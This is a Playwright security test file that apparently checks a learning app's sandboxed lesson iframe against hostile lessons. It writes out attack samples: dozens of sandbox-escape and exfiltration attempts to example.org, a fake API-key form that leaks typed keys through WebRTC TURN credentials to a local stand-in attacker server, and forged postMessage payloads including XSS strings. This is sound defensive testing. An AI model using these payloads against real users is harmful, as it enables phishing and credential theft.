// T-046 (tester): independent check of T-045 (lessons in an opaque origin with a
// postMessage bridge, D-029). Written without reusing the developer's tests:
// the hostile lessons, the attack list and the checks are my own.
//
// Synthetic data only (D-026): tests/fixtures/LRN-DEMO and hostile courses built
// in memory here (LRN-EVIL and friends). A fake key is put in the settings.
// Every external http(s) request is answered by a stub and recorded; a UDP
// listener on 127.0.0.1 stands in for an attacker's TURN server (WebRTC).
//
// Known defects are marked test.fail() with their id from the T-046 log
// (T046-S1, T046-D1, T046-D2). When a defect is fixed its test fails as
// "expected to fail": then remove test.fail.
//
// Note (T-045 log): in Playwright every evaluate() counts as a user activation,
// also for the parent. Messages that must arrive WITHOUT a gesture are sent by
// a timer in the lesson after more than 5 s, and the test waits without
// evaluate() calls.
import { test, expect } from '@playwright/test';
import dgram from 'node:dgram';
import { DRIVE_ZIP_NAME, readFixture, makeZip, asFile } from '../fixtures/zips.mjs';
import { strToU8 } from '../../vendor/fflate.js';

const FAKE_KEY = 'sk-ant-T046-FAKE-KEY-0123456789';
const TYPED_KEY = 'sk-ant-api03-TYPED-INTO-THE-LESSON';
const NO_GESTURE_MS = 5600;

let problems; // page errors and console errors
let allowed; // console errors expected in a test (CSP reports and the like)
let external; // external http(s) requests that reached the network layer (the stub)
let popups;
let consoleAll;
test.beforeEach(async ({ page, context }) => {
  problems = [];
  allowed = [];
  external = [];
  popups = [];
  consoleAll = [];
  page.on('console', (m) => {
    consoleAll.push(`${m.type()}: ${m.text()}`);
    if (m.type() === 'error') problems.push(m.text());
  });
  page.on('pageerror', (e) => { problems.push(`pageerror: ${e}`); if (process.env.T046_DEBUG) console.log('PAGEERROR', e?.stack, consoleAll.slice(-3)); });
  context.on('page', (p) => { if (p !== page) popups.push(p); });
  await context.route(/^https?:\/\/(?!localhost)/, (route) => {
    external.push(route.request().url());
    return route.fulfill({ status: 200, contentType: 'text/html', body: '<p>external</p>' });
  });
  await page.goto('./');
  await expect(page.locator('[data-screen="courses"]')).toBeVisible();
  await page.evaluate(() => navigator.serviceWorker.ready.then(() => true));
  await page.reload();
  expect(await page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
  await page.evaluate(async (k) => {
    await (await import('./src/db.js')).saveSettings({ apiKey: k });
    localStorage.setItem('t046', 'LS-SECRET-T046');
    sessionStorage.setItem('t046', 'SS-SECRET-T046');
  }, FAKE_KEY);
});
test.afterEach(() => {
  expect(problems.filter((p) => !allowed.some((re) => re.test(p)))).toEqual([]);
  expect(consoleAll.filter((m) => /escape its sandboxing/i.test(m))).toEqual([]);
});

// --- helpers -----------------------------------------------------------------------

async function importFiles(page, files) {
  return page.evaluate(async (files) => {
    const m = await import('./src/course-import.js');
    const list = files.map((f) => new File([new Uint8Array(f.bytes)], f.name));
    return m.describeSummary(await m.importCourse(list));
  }, files.map((f) => ({ name: f.name, bytes: [...f.buffer] })));
}
const importDemo = (page) => importFiles(page, [asFile(DRIVE_ZIP_NAME, makeZip(readFixture()))]);
const importCourse = (page, id, files) => importFiles(page, [asFile(`${id}.zip`, makeZip(files, { root: id }))]);
const doc = (body, head = '') => strToU8(`<!DOCTYPE html><html lang="bg"><head><meta charset="utf-8"><title>Зъл урок</title>${head}</head><body>${body}</body></html>`);
const lf = (page) => page.frameLocator('iframe.lesson-frame');
const frameOf = (page, course) => page.frames().find((f) => f.url().includes(`/EasyLRN/c/${course}/`));
const lessonState = (page) => page.locator('.lesson-frame__wrap').getAttribute('data-lesson-state');

async function openLesson(page, course, number = '0001', { wait = 'ready' } = {}) {
  await page.goto(`./#/c/${course}`);
  await page.goto(`./#/c/${course}/read/${number}`);
  if (wait) await expect(page.locator(`[data-lesson-state="${wait}"]`)).toBeVisible({ timeout: 20000 });
  return frameOf(page, course);
}

/** Everything the app must still have after an attack. */
async function appIntact(page, { url, title } = {}) {
  const s = await page.evaluate(async () => ({
    key: (await (await import('./src/db.js')).getSettings()).apiKey,
    ls: localStorage.getItem('t046'),
    caches: (await caches.keys()).sort(),
    scripts: [...document.scripts].map((x) => x.getAttribute('src')),
    frames: document.querySelectorAll('iframe').length,
    sandbox: document.querySelector('iframe.lesson-frame')?.getAttribute('sandbox') ?? null,
    shell: (await (await (await caches.open('easylrn-shell-0.5.0')).match('./index.html')).text()).includes('src/main.js'),
  }));
  expect(s.key).toBe(FAKE_KEY);
  expect(s.ls).toBe('LS-SECRET-T046');
  expect(s.caches).toEqual(['easylrn-shell-0.5.0']);
  expect(s.scripts).toEqual(['src/main.js']);
  expect(s.frames).toBeLessThanOrEqual(1);
  if (s.sandbox !== null) expect(s.sandbox).toBe('allow-scripts');
  expect(s.shell).toBe(true);
  if (url) expect(page.url()).toBe(url);
  if (title) expect(await page.title()).toBe(title);
}

/** A UDP server on 127.0.0.1 that answers a TURN Allocate with 401 (REALM/NONCE), like a real TURN server. */
async function turnServer() {
  const sock = dgram.createSocket('udp4');
  const packets = [];
  sock.on('message', (b, rinfo) => {
    packets.push(b.toString('latin1'));
    if (b.length >= 20 && b.readUInt16BE(0) === 0x0003 && !b.toString('latin1').includes('LEAK:')) {
      const attr = (type, val) => {
        const h = Buffer.alloc(4);
        h.writeUInt16BE(type, 0);
        h.writeUInt16BE(val.length, 2);
        return Buffer.concat([h, val, Buffer.alloc((4 - (val.length % 4)) % 4)]);
      };
      const body = Buffer.concat([
        attr(0x0009, Buffer.concat([Buffer.from([0, 0, 4, 1]), Buffer.from('Unauthorized')])),
        attr(0x0014, Buffer.from('evil')),
        attr(0x0015, Buffer.from('nonce-t046')),
      ]);
      const head = Buffer.alloc(20);
      head.writeUInt16BE(0x0113, 0);
      head.writeUInt16BE(body.length, 2);
      b.copy(head, 4, 4, 20);
      sock.send(Buffer.concat([head, body]), rinfo.port, rinfo.address);
    }
  });
  await new Promise((ok) => sock.bind(0, '127.0.0.1', ok));
  return { port: sock.address().port, packets, close: () => sock.close() };
}

const EVIL = {
  'INDEX.md': strToU8('# LRN-EVIL\n'),
  'lessons/0001-urok.html': doc('<h1>Урок</h1><p id="p1">Първи абзац.</p><a id="ok" href="https://example.org/allowed">позволен</a><p style="height:1500px">…</p>'),
  'lessons/0002-vtori.html': doc('<h1>Втори</h1>'),
};

// --- 1. The attempts of T-010 again, and more ---------------------------------------

test.describe('T-046 a hostile lesson cannot reach the app (T-010 attempts + new ones)', () => {
  test('44 attempts from the lesson script: nothing of the app is read or changed, no request leaves, no tab opens', async ({ page }) => {
    allowed = [/Content Security Policy|Refused|violates|sandbox|Blocked|Unsafe attempt|not allowed|Failed to load|status of 40|ERR_|allow-modals|Ignored call|permissions policy/i,
      /^pageerror: undefined$/]; // the error event of the blocked blob: worker, inside the lesson
    await importCourse(page, 'LRN-EVIL', EVIL);
    const f = await openLesson(page, 'LRN-EVIL');
    const url = page.url();
    const title = await page.title();
    await page.evaluate(() => {
      window.__bc = [];
      new BroadcastChannel('easylrn').onmessage = (e) => window.__bc.push(e.data);
      window.name = 'APP-WINDOW-NAME';
    });
    const r = await f.evaluate(async (k) => {
      const out = {};
      const attempt = async (name, fn) => {
        try { const v = await fn(); out[name] = v === undefined ? 'undefined' : String(v); } catch (e) { out[name] = `blocked:${e.name}`; }
      };
      // S1a–S1f and the other attempts of T-010
      await attempt('parent.document', () => parent.document.body.innerHTML.length);
      await attempt('top.document', () => top.document.cookie);
      await attempt('frameElement', () => (frameElement ? frameElement.removeAttribute('sandbox') : 'null'));
      await attempt('localStorage', () => localStorage.getItem('t046'));
      await attempt('sessionStorage', () => sessionStorage.getItem('t046'));
      await attempt('indexedDB lrn-app', () => new Promise((ok, no) => { const q = indexedDB.open('lrn-app'); q.onsuccess = () => ok(q.result.objectStoreNames.length); q.onerror = () => no(q.error); }));
      await attempt('indexedDB.databases', () => indexedDB.databases().then((d) => JSON.stringify(d)));
      await attempt('caches.keys', () => caches.keys().then((x) => x.join()));
      await attempt('caches.put shell', () => caches.open('easylrn-shell-0.5.0').then((c) => c.put('../../../index.html', new Response('pwned'))));
      await attempt('cookie', () => { document.cookie = 'x=1'; return document.cookie; });
      await attempt('serviceWorker.register', () => navigator.serviceWorker.register('../../../sw.js'));
      await attempt('serviceWorker.getRegistrations', () => navigator.serviceWorker.getRegistrations().then((x) => x.length));
      await attempt('parent.open', () => parent.open(`https://example.org/po?k=${k}`));
      await attempt('window.open', () => window.open(`https://example.org/wo?k=${k}`));
      await attempt('top.location', () => { top.location.href = `https://example.org/top?k=${k}`; });
      await attempt('parent.location.replace', () => parent.location.replace(`https://example.org/rep?k=${k}`));
      await attempt('parent.location.hash', () => { parent.location.hash = '#/settings'; });
      await attempt('parent.fetch', () => parent.fetch('https://api.anthropic.com/v1/messages', { method: 'POST' }));
      await attempt('parent.eval', () => parent.eval('1'));
      await attempt('fetch', () => fetch(`https://example.org/f?k=${k}`).then((x) => x.status));
      await attempt('fetch same origin', () => fetch('../../../src/db.js').then((x) => x.status));
      await attempt('xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', 'https://example.org/x'); x.onload = () => ok(x.status); x.onerror = () => no(new Error('xhr')); x.send(); }));
      await attempt('beacon', () => navigator.sendBeacon('https://example.org/b', 'k'));
      await attempt('websocket', () => new Promise((ok, no) => { const w = new WebSocket('wss://example.org/ws'); w.onopen = () => ok('open'); w.onerror = () => no(new Error('ws')); }));
      await attempt('eventsource', () => new Promise((ok, no) => { const e = new EventSource('https://example.org/es'); e.onopen = () => ok('open'); e.onerror = () => no(new Error('es')); }));
      await attempt('worker blob', () => new Promise((ok, no) => {
        const w = new Worker(URL.createObjectURL(new Blob(['postMessage("ran")'])));
        w.onmessage = (e) => ok(e.data);
        w.onerror = (e) => { e.preventDefault(); no(Object.assign(new Error('worker'), { name: 'WorkerBlocked' })); };
      }));
      await attempt('sharedworker', () => { new SharedWorker('data:text/javascript,1'); return 'created'; });
      // new in T-046
      await attempt('BroadcastChannel to the app', () => { new BroadcastChannel('easylrn').postMessage(`from-lesson ${k}`); return 'posted'; });
      await attempt('top.name', () => top.name);
      await attempt('clipboard.readText', () => navigator.clipboard.readText());
      await attempt('document.domain', () => { document.domain = 'localhost'; return document.domain; });
      await attempt('dynamic import', () => import('https://example.org/m.js'));
      await attempt('css background url', () => { document.body.style.background = 'url(https://example.org/bg.png)'; return 'set'; });
      await attempt('css @import', () => { const s = document.createElement('style'); s.textContent = '@import url(https://example.org/i.css);'; document.head.append(s); return 'added'; });
      await attempt('font-face', () => new FontFace('x', 'url(https://example.org/f.woff2)').load());
      await attempt('svg image / object / embed / iframe / video', () => {
        document.body.insertAdjacentHTML('beforeend', '<svg><image href="https://example.org/svg.png"/></svg><object data="https://example.org/obj"></object>'
          + '<embed src="https://example.org/emb"><iframe src="https://example.org/if"></iframe><video src="https://example.org/v.mp4"></video>');
        return 'added';
      });
      await attempt('link prefetch/preload/preconnect', () => {
        for (const rel of ['prefetch', 'preload', 'preconnect', 'dns-prefetch', 'prerender']) {
          const l = document.createElement('link'); l.rel = rel; l.as = 'fetch'; l.href = `https://example.org/${rel}`; document.head.append(l);
        }
        return 'added';
      });
      await attempt('speculation rules', () => { const s = document.createElement('script'); s.type = 'speculationrules'; s.textContent = JSON.stringify({ prefetch: [{ source: 'list', urls: ['https://example.org/spec'] }] }); document.head.append(s); return 'added'; });
      await attempt('a ping', () => { const a = document.createElement('a'); a.href = '#x'; a.ping = 'https://example.org/ping'; document.body.append(a); a.click(); return 'clicked'; });
      await attempt('form submit', () => { const fm = document.createElement('form'); fm.action = 'https://example.org/form'; fm.method = 'post'; fm.target = '_blank'; document.body.append(fm); fm.submit(); return 'submitted'; });
      await attempt('a download', () => { const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob(['x'])); a.download = 'x.txt'; document.body.append(a); a.click(); return 'clicked'; });
      await attempt('base href', () => { const b = document.createElement('base'); b.href = 'https://example.org/'; document.head.prepend(b); return document.baseURI; });
      await attempt('alert', () => alert('x'));
      await attempt('Notification', () => Notification.requestPermission());
      await new Promise((ok) => setTimeout(ok, 1500));
      return out;
    }, FAKE_KEY);

    const mustBlock = ['parent.document', 'top.document', 'localStorage', 'sessionStorage', 'indexedDB lrn-app', 'indexedDB.databases', 'caches.keys',
      'caches.put shell', 'cookie', 'serviceWorker.register', 'serviceWorker.getRegistrations', 'parent.open', 'top.location', 'parent.location.replace',
      'parent.location.hash', 'parent.fetch', 'parent.eval', 'fetch', 'fetch same origin', 'xhr', 'websocket', 'eventsource', 'worker blob', 'sharedworker',
      'top.name', 'clipboard.readText', 'document.domain', 'dynamic import', 'font-face'];
    for (const name of mustBlock) expect(r[name], name).toMatch(/^blocked:/);
    expect(r.frameElement).toBe('null');
    expect(r['window.open']).toBe('null');
    console.log(`T-046 attempts: ${JSON.stringify(r)}`);
    expect(r['base href']).not.toContain('example.org');
    expect(JSON.stringify(Object.values(r))).not.toMatch(/LS-SECRET|SS-SECRET|sk-ant-T046|APP-WINDOW-NAME|lrn-app/);
    await page.waitForTimeout(800);
    expect(await page.evaluate(() => window.__bc)).toEqual([]);
    expect(external).toEqual([]);
    expect(popups).toEqual([]);
    await appIntact(page, { url, title });
  });

  test('[T046-S1] WebRTC: the lesson can send what it knows (e.g. a key typed into a fake form) to any host over UDP (TURN/STUN)', async ({ page }) => {
    test.fail(true, 'T046-S1: CSP connect-src does not cover WebRTC in Chromium; RTCPeerConnection is available in the opaque lesson');
    const turn = await turnServer();
    try {
      await importCourse(page, 'LRN-EVIL', {
        ...EVIL,
        'lessons/0001-urok.html': doc(`<h1>Настройки на EasyLRN</h1>
          <p>За да продължиш урока, въведи своя Claude API ключ.</p>
          <input id="key" type="password" autocomplete="off"> <button id="save">Запази</button>
          <script>
            document.getElementById('save').onclick = async () => {
              const v = document.getElementById('key').value;
              const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:127.0.0.1:${turn.port}?transport=udp', username: 'LEAK:' + v, credential: 'x' }] });
              pc.createDataChannel('d');
              await pc.setLocalDescription(await pc.createOffer());
            };
          </script>`),
      });
      await openLesson(page, 'LRN-EVIL');
      await lf(page).locator('#key').fill(TYPED_KEY);
      await lf(page).locator('#save').click();
      await page.waitForTimeout(3000);
      expect(external).toEqual([]); // http(s): nothing
      // UDP to the attacker's host: must be nothing at all.
      expect(turn.packets.filter((p) => p.includes(TYPED_KEY))).toEqual([]);
      expect(turn.packets.length).toBe(0);
    } finally {
      turn.close();
    }
  });

  test('fake API-key form: the typed text cannot leave over http(s), a popup, a navigation or a link; only one gesture-bound allowlisted tab per click', async ({ page }) => {
    allowed = [/Content Security Policy|Refused|violates|sandbox|Blocked|Unsafe attempt|not allowed|Failed to load|status of 40|ERR_|net::|Failed to fetch/i];
    const links = 'abcdefghijklmnopqrstuvwxyz'.split('').map((c) => `<a hidden href="https://example.org/c/${c}">${c}</a>`).join('');
    await importCourse(page, 'LRN-EVIL', {
      ...EVIL,
      'lessons/0001-urok.html': doc(`<h1>Въведи ключа</h1><input id="key"> <button id="letters">Провери</button> <button id="save">Запази</button>${links}
        <script>
          document.getElementById('save').onclick = () => {
            const k = document.getElementById('key').value;
            const tries = [
              () => fetch('https://example.org/f?k=' + k),
              () => { new Image().src = 'https://example.org/i?k=' + k; },
              () => navigator.sendBeacon('https://example.org/b', k),
              () => window.open('https://example.org/w?k=' + k),
              () => { const f = document.createElement('form'); f.action = 'https://example.org/form'; f.target = '_top'; f.innerHTML = '<input name=k>'; f.k.value = k; document.body.append(f); f.submit(); },
              () => { location.href = 'https://example.org/nav?k=' + k; },
              () => parent.postMessage({ lrn: 1, type: 'lrn:link', href: 'https://example.org/link?k=' + k }, '*'),
              // last: navigate the own frame to the app's own site with the text in the query (I-5: allowed by frame-src 'self')
              () => setTimeout(() => { location.href = '../../../leak?k=' + encodeURIComponent(k); }, 300),
            ];
            for (const t of tries) { try { t(); } catch (e) {} }
          };
          // a covert channel through the allowlist: one link per letter, all in one gesture
          document.getElementById('letters').onclick = () => {
            const k = document.getElementById('key').value;
            for (const c of k.toLowerCase().replace(/[^a-z]/g, '').slice(0, 3)) parent.postMessage({ lrn: 1, type: 'lrn:link', href: 'https://example.org/c/' + c }, '*');
          };
        </script>`),
    });
    await openLesson(page, 'LRN-EVIL');
    const sameSite = [];
    page.context().on('request', (q) => { if (q.url().includes('TYPED-INTO') && q.url().startsWith('http://localhost')) sameSite.push(q.url()); });
    await lf(page).locator('#key').fill(TYPED_KEY);
    await lf(page).locator('#letters').click();
    await page.waitForTimeout(800);
    // The allowlist channel exists but is narrow: at most one tab per gesture (window.open consumes the activation).
    expect(popups.length).toBeLessThanOrEqual(1);
    if (popups.length) {
      expect(popups[0].url()).toMatch(/^https:\/\/example\.org\/c\/[a-z]$/);
      expect(await popups[0].evaluate(() => window.opener)).toBe(null);
    }
    const letterTabs = popups.map((p) => p.url());
    await lf(page).locator('#save').click();
    await page.waitForTimeout(2000);
    // I-5 (accepted by the architect): the text can reach the app's own web server (GitHub Pages logs), nothing else.
    console.log(`T-046 fake form: tabs from one tap ${letterTabs}, same-site requests ${sameSite}`);
    for (const u of sameSite) expect(new URL(u).origin).toBe(new URL(page.url()).origin);
    for (const u of external) expect(u).not.toContain(TYPED_KEY);
    for (const p of popups) expect(p.url()).not.toContain(TYPED_KEY);
    expect(popups.length).toBe(letterTabs.length);
    expect(page.url()).toMatch(/#\/c\/LRN-EVIL\/read\/0001$/);
  });

  test('history: the lesson cannot move the app back, and its own history entries do not change the app route', async ({ page }) => {
    await importCourse(page, 'LRN-EVIL', EVIL);
    const f = await openLesson(page, 'LRN-EVIL');
    const url = page.url();
    // Without a gesture (timer), as a real lesson would.
    await f.evaluate((ms) => setTimeout(() => { history.go(-1); history.back(); history.go(-2); }, ms), NO_GESTURE_MS);
    await page.waitForTimeout(NO_GESTURE_MS + 1500);
    expect(page.url()).toBe(url);
    await expect(page.locator('[data-screen="reader"]')).toHaveCount(1);
    await f.evaluate(() => { for (let i = 0; i < 5; i++) history.pushState({}, '', `#x${i}`); });
    expect(page.url()).toBe(url);
  });

  test('clipboard: the lesson cannot read the clipboard, even after a tap inside it and with the permission granted to the app', async ({ page, context }) => {
    allowed = [/permissions policy/i];
    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
    await page.evaluate(() => navigator.clipboard.writeText('CLIPBOARD-SECRET'));
    await importCourse(page, 'LRN-EVIL', {
      ...EVIL,
      'lessons/0001-urok.html': doc(`<h1>Урок</h1><button id="b">Провери</button><output id="o"></output>
        <script>document.getElementById('b').onclick = () => navigator.clipboard.readText().then((t) => { o.textContent = 'read:' + t; }, (e) => { o.textContent = 'blocked:' + e.name; });</script>`),
    });
    await openLesson(page, 'LRN-EVIL');
    await lf(page).locator('#b').click();
    await expect(lf(page).locator('#o')).toHaveText(/^blocked:/);
  });
});

// --- 2. The lesson navigates its own frame ------------------------------------------------

test.describe('T-046 self-navigation of the lesson frame', () => {
  const TARGETS = {
    'app ../index.html': '../../../index.html',
    'app #/settings': '../../../index.html#/settings',
    'app ./ (scope root)': '../../../',
    'same course, other lesson': './0002-vtori.html',
    'other course (LRN-DEMO)': '../../LRN-DEMO/lessons/0001-vidove-chay.html',
    'reload itself': 'RELOAD',
    'blob: made by the lesson': 'BLOB',
    'data:': 'data:text/html,<h1>data</h1>',
    'javascript:': 'javascript:document.title="js"',
    'external': 'https://example.org/nav',
    'meta refresh (dynamic)': 'META',
    'a target=_self past the bridge': 'ANCHOR',
  };
  for (const [name, target] of Object.entries(TARGETS)) {
    test(`after load: ${name} → the app never runs inside, nothing external, the lesson comes back`, async ({ page }) => {
      allowed = [/status of 40|Refused|violates|Failed to load|ERR_|Not allowed|net::|CORS|Unsafe attempt|sandbox/i];
      await importDemo(page);
      await importCourse(page, 'LRN-EVIL', EVIL);
      const f = await openLesson(page, 'LRN-EVIL');
      const url = page.url();
      await f.evaluate((t) => {
        if (t === 'RELOAD') location.reload();
        else if (t === 'BLOB') location.href = URL.createObjectURL(new Blob(['<h1>blob</h1><script>parent.postMessage({lrn:1,type:"lrn:size",height:5},"*")</script>'], { type: 'text/html' }));
        else if (t === 'META') document.head.insertAdjacentHTML('beforeend', '<meta http-equiv="refresh" content="0;url=../../../index.html">');
        else if (t === 'ANCHOR') {
          window.addEventListener('click', (e) => e.stopImmediatePropagation(), true);
          const a = document.createElement('a'); a.href = '../../../index.html'; a.target = '_self'; document.body.append(a); a.click();
        } else location.href = t;
      }, target);
      await page.waitForTimeout(1500);
      for (const fr of page.frames()) {
        if (fr === page.mainFrame()) continue;
        const inside = await fr.evaluate(() => {
          let db = 'no';
          try { indexedDB.open('lrn-app'); db = 'open'; } catch { /* opaque */ }
          return { origin: self.origin, app: !!document.querySelector('[data-screen]'), db };
        }).catch(() => ({ origin: 'gone', app: false, db: 'no' }));
        expect(inside.app, name).toBe(false);
        expect(['null', 'gone'], name).toContain(inside.origin);
        expect(inside.db, name).toBe('no');
      }
      if (!target.startsWith('javascript')) {
        await expect(page.locator('[data-field="lesson-note"]'), name).toHaveText(/зареден е отново/, { timeout: 8000 });
        await expect(page.locator('[data-lesson-state="ready"]')).toBeVisible();
        await expect(lf(page).locator('h1')).toHaveText('Урок');
      }
      expect(external).toEqual([]);
      expect(popups).toEqual([]);
      await appIntact(page, { url });
    });
  }

  for (const [name, script] of Object.entries({
    'blob:': 'location.href = URL.createObjectURL(new Blob(["<h1>blob</h1>"], { type: "text/html" }));',
    'other course': 'location.href = "../../LRN-DEMO/lessons/0001-vidove-chay.html";',
    'app #/settings': 'location.replace("../../../index.html#/settings");',
  })) {
    test(`at once from an inline script: ${name} → stopped after two attempts, the app never inside`, async ({ page }) => {
      test.setTimeout(60_000);
      allowed = [/status of 40|Refused|violates|Failed to load|ERR_|Not allowed|net::|CORS|Unsafe attempt/i];
      await importDemo(page);
      await importCourse(page, 'LRN-NAV', { 'INDEX.md': strToU8('# LRN-NAV\n'), 'lessons/0001-nav.html': doc(`<h1>Урок</h1><script>${script}</script>`) });
      await openLesson(page, 'LRN-NAV', '0001', { wait: null });
      await expect(page.locator('[data-lesson-state="error"]')).toBeVisible({ timeout: 20000 });
      for (const fr of page.frames()) {
        if (fr === page.mainFrame()) continue;
        expect(await fr.evaluate(() => self.origin + !!document.querySelector('[data-screen]')).catch(() => 'nullfalse')).toBe('nullfalse');
      }
      expect(page.url()).toMatch(/#\/c\/LRN-NAV\/read\/0001$/);
      expect(external).toEqual([]);
      await appIntact(page);
    });
  }

  test('like GitHub Pages (Access-Control-Allow-Origin: *): the app index.html in the opaque frame refuses to start and has no storage', async ({ page, context }) => {
    allowed = [/status of 40|Refused|violates|Failed to load|ERR_|net::|CORS/i];
    // GitHub Pages answers every file with ACAO: * — then the module scripts of the app DO load in an opaque frame.
    await context.route(/^http:\/\/localhost:\d+\/EasyLRN\/(?!c\/)/, async (route) => {
      const res = await route.fetch();
      await route.fulfill({ response: res, headers: { ...res.headers(), 'access-control-allow-origin': '*' } });
    });
    await importCourse(page, 'LRN-EVIL', EVIL);
    const f = await openLesson(page, 'LRN-EVIL');
    await f.evaluate(() => { location.href = '../../../index.html#/settings'; });
    let seen = null;
    for (let i = 0; i < 40 && !seen?.framed; i++) {
      for (const fr of page.frames()) {
        if (fr === page.mainFrame() || !fr.url().endsWith('index.html#/settings')) continue;
        seen = await fr.evaluate(() => ({ origin: self.origin, framed: document.querySelector('[data-field="framed"]')?.textContent ?? null, screens: document.querySelectorAll('[data-screen]').length })).catch(() => seen);
      }
      if (!seen?.framed) await page.waitForTimeout(50);
    }
    console.log(`T-046 ACAO: ${JSON.stringify(seen)}`);
    expect(seen).not.toBe(null);
    expect(seen.origin).toBe('null');
    expect(seen.screens).toBe(0);
    await expect(page.locator('[data-lesson-state="ready"]')).toBeVisible({ timeout: 8000 });
    await appIntact(page);
  });

  test('a lesson URL opened as the top page (not in the app): opaque origin, no storage, no bridge, nothing leaves', async ({ page }) => {
    allowed = [/Refused|violates|sandbox|Blocked|status of 40/i];
    await importCourse(page, 'LRN-EVIL', {
      ...EVIL,
      'assets/x.svg': strToU8('<svg xmlns="http://www.w3.org/2000/svg"><script>document.documentElement.setAttribute("data-ran", self.origin)</script></svg>'),
    });
    await page.goto('./#/c/LRN-EVIL/read/0001');
    await expect(page.locator('[data-lesson-state="ready"]')).toBeVisible();
    for (const path of ['lessons/0001-urok.html', 'assets/x.svg']) {
      await page.goto(`./c/LRN-EVIL/${path}`);
      const r = await page.evaluate(async () => {
        const t = (fn) => { try { return String(fn()); } catch (e) { return `blocked:${e.name}`; } };
        return { origin: self.origin, ls: t(() => localStorage.length), idb: t(() => indexedDB.open('lrn-app') && 'opened'), sw: t(() => navigator.serviceWorker.controller), open: t(() => window.open('https://example.org/x')) };
      });
      expect(r, path).toEqual({ origin: 'null', ls: 'blocked:SecurityError', idb: 'blocked:SecurityError', sw: 'blocked:SecurityError', open: 'null' });
    }
    expect(external).toEqual([]);
    expect(popups).toEqual([]);
  });
});

// --- 3. Forged and excessive messages ------------------------------------------------------

test.describe('T-046 forged messages', () => {
  test('odd shapes, prototype keys, huge and negative values, unknown ids, links without a gesture: ignored, no app error, nothing changes', async ({ page }) => {
    test.setTimeout(60_000);
    await importDemo(page);
    const f = await openLesson(page, 'LRN-DEMO');
    const frame = page.locator('iframe.lesson-frame');
    const h0 = await frame.evaluate((el) => el.style.height);
    const url = page.url();
    await f.evaluate((ms) => setTimeout(() => {
      const p = (m, t) => { try { parent.postMessage(m, '*', t); } catch (e) { /* not cloneable */ } };
      const big = 'й'.repeat(3e6);
      const msgs = [
        null, undefined, 0, true, 'lrn:size', big, new Date(), /re/, new Map([[1, 2]]), new ArrayBuffer(8), new Blob(['x']),
        Object.create(null), JSON.parse('{"__proto__":{"lrn":1,"type":"lrn:size","height":5}}'),
        { lrn: '1', type: 'lrn:size', height: 5 }, { lrn: 1n, type: 'lrn:size', height: 5 }, { lrn: 1, type: 'LRN:SIZE', height: 5 },
        { lrn: 1, type: '__proto__' }, { lrn: 1, type: 'constructor' }, { lrn: 1, type: 'hasOwnProperty' }, { lrn: 1, type: 'toString' },
        { lrn: 1, type: 'lrn:init' }, { lrn: 1, type: 'lrn:scroll-to', fragment: 'x' }, { lrn: 1, type: big },
        { lrn: 1, type: 'lrn:size', height: -1 }, { lrn: 1, type: 'lrn:size', height: -0.0001 }, { lrn: 1, type: 'lrn:size', height: Infinity },
        { lrn: 1, type: 'lrn:size', height: 1e308 }, { lrn: 1, type: 'lrn:size', height: 200001 }, { lrn: 1, type: 'lrn:size', height: 5n },
        { lrn: 1, type: 'lrn:size', height: [5] }, { lrn: 1, type: 'lrn:size' }, { lrn: 1, type: 'lrn:size', height: '5' },
        { lrn: 1, type: 'lrn:ready', v: 2 }, { lrn: 1, type: 'lrn:ready', v: 1, title: big }, { lrn: 1, type: 'lrn:ready', v: 1, textLength: -1 },
        { lrn: 1, type: 'lrn:selection', empty: false, quote: { exact: big }, position: { start: 0, end: 1 } },
        { lrn: 1, type: 'lrn:selection', empty: false, quote: { exact: 'x', prefix: 'p'.repeat(65) }, position: { start: 0, end: 1 } },
        { lrn: 1, type: 'lrn:selection', empty: false, quote: { exact: 'x' }, position: { start: -1, end: 1 } },
        { lrn: 1, type: 'lrn:selection', empty: false, quote: { exact: 'x' }, position: { start: 0, end: 1e8 } },
        { lrn: 1, type: 'lrn:selection', empty: false, quote: { exact: '<img src=x onerror=alert(1)>' }, position: { start: 0, end: 1 }, hint: 'h'.repeat(201) },
        { lrn: 1, type: 'lrn:tap', annotationId: 'unknown' }, { lrn: 1, type: 'lrn:tap', annotationId: { id: 1 } }, { lrn: 1, type: 'lrn:tap', annotationId: '__proto__' },
        { lrn: 1, type: 'lrn:anchored', results: [{ id: '__proto__', state: 'ok' }] }, { lrn: 1, type: 'lrn:anchored', results: new Array(10001).fill(0) },
        { lrn: 1, type: 'lrn:layout', items: 'x', height: 1 }, { lrn: 1, type: 'lrn:position', top: 99999 }, { lrn: 1, type: 'lrn:position', top: -50 },
        { lrn: 1, type: 'lrn:anchor', top: 99999 }, { lrn: 1, type: 'lrn:anchor', top: Infinity }, { lrn: 1, type: 'lrn:fonts-ok', loaded: 1e9 },
        { lrn: 1, type: 'lrn:link', href: 'https://example.org/tea' }, // allowlisted, but no gesture
        { lrn: 1, type: 'lrn:link', href: 'javascript:parent.alert(1)' }, { lrn: 1, type: 'lrn:link', href: 'data:text/html,<script>alert(1)</script>' },
        { lrn: 1, type: 'lrn:link', href: 'blob:null/x' }, { lrn: 1, type: 'lrn:link', href: 'http://localhost:1/EasyLRN/#/settings' },
        { lrn: 1, type: 'lrn:link', href: `${location.origin}/EasyLRN/c/LRN-DEMO/reference/R01-temperatura-i-vreme.html` },
        { lrn: 1, type: 'lrn:link', href: 'https://claude.ai/artifact/DemoArtifactR01' },
        { lrn: 1, type: 'lrn:link', href: `https://example.org/${'x'.repeat(3000)}` }, { lrn: 1, type: 'lrn:link', href: ['https://example.org/tea'] },
      ];
      for (const m of msgs) p(m);
      const ch = new MessageChannel();
      p({ lrn: 1, type: 'lrn:size', height: 5, port: ch.port1 }, [ch.port1]);
      document.documentElement.setAttribute('data-forged', String(msgs.length));
    }, ms), NO_GESTURE_MS);
    await page.waitForTimeout(NO_GESTURE_MS + 1500);
    expect(Number(await f.evaluate(() => document.documentElement.getAttribute('data-forged')))).toBeGreaterThan(50);
    expect(await frame.evaluate((el) => el.style.height)).toBe(h0);
    expect(page.url()).toBe(url);
    expect(await page.evaluate(() => scrollY)).toBe(0);
    expect(popups).toEqual([]);
    expect(external).toEqual([]);
    expect(await lessonState(page)).toBe('ready');
    expect(await page.locator('body img').count()).toBe(0);
    await appIntact(page, { url });
  });

  test('1000 messages at once and a 5 s storm of big ones: at most 60 per second taken, the app stays responsive', async ({ page }) => {
    test.setTimeout(40_000);
